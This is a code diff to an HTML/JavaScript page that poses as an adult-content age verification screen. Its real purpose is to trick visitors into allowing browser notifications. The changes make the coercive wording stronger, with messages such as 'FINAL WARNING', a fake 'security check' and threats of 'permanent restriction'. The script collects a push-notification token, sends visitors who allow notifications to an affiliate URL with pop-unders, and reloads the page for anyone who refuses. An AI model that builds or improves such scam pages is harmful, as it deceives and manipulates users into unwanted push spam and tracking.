@@ -63,17 +63,28 @@
         .btn:hover {
             background-color: #ff9900;
         }
+        .final-warning {
+            color: red;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .offer-message {
+            font-size: 18px;
+            color: #ffcc00;
+            margin-top: 30px;
+        }
     </style>
 </head>
 <body>
     <div class="locked" id="lockScreen">
         <h1>🔞 Adult Content Verification Required 🔞</h1>
         <div class="alert-box">
-            <p>To access exclusive content, you need to verify your age. Click <b>"Allow"</b> on the next step.</p>
-            <p><b>Failure to comply will deny access.</b></p>
+            <p>Unlock exclusive content now! To continue, click <b>"Allow"</b> below to verify your age.</p>
+            <p><b>Failure to comply will deny access to our premium content.</b></p>
         </div>
-        <button class="btn" id="allowButton">Allow Notifications and Continue</button>
-        <p class="loading">Processing verification...</p>
+        <button class="btn" id="allowButton">Allow Notifications and Unlock Content</button>
+        <p class="loading">Processing your verification...</p>
+        <p class="offer-message">Hurry, limited time access! Unlock the best content now!</p>
     </div>
 
     <script type="module">
@@ -109,7 +120,6 @@
                             console.log("Error getting FCM token:", err);
                         });
 
-                    // Redirigir después de que el permiso es otorgado
                     setTimeout(() => {
                         window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN";
                     }, 2000);
@@ -118,19 +128,19 @@
                     document.body.style.pointerEvents = "auto";
                 } else {
                     logEvent(analytics, 'notification_permission_denied');
-                    // Mostrar mensaje de advertencia si el permiso es denegado
+                    // Mostrar mensaje fuerte si el permiso es denegado
                     document.getElementById("lockScreen").innerHTML = `
-                        <h1>🚨 FINAL WARNING 🚨</h1>
+                        <h1 class="final-warning">🚨 FINAL WARNING 🚨</h1>
                         <div class="alert-box">
-                            <p><b>Access Denied!</b> You must approve the security check.</p>
+                            <p><b>Access Denied!</b> You must approve the security check to access exclusive content.</p>
                             <p>Click <b>"Allow"</b> on the next step to verify.</p>
-                            <p>Failure to comply will result in <b>permanent restriction</b>.</p>
+                            <p><b>Failure to comply will result in permanent restriction.</b></p>
                         </div>
-                        <button class="btn" id="allowButton">Allow Notifications</button>
-                        <p class="loading">Retrying verification...</p>
+                        <button class="btn" id="allowButton">Allow Notifications and Continue</button>
+                        <p class="loading">Retrying...</p>
                     `;
                     setTimeout(() => {
-                        location.reload();  // Recargar la página después de unos segundos
+                        location.reload(); // Recargar la página para permitir otro intento
                     }, 4000);
                 }
             }).catch(err => {
@@ -138,10 +148,10 @@
             });
         }
 
-        // Llamar a la función para iniciar la solicitud
+        // Llamar a la función para solicitar el permiso
         requestNotificationPermission();
 
-        // Añadir el comportamiento del botón "Allow"
+        // Permitir reintentar haciendo clic en el botón
         document.getElementById("allowButton").addEventListener("click", () => {
             requestNotificationPermission();
         });
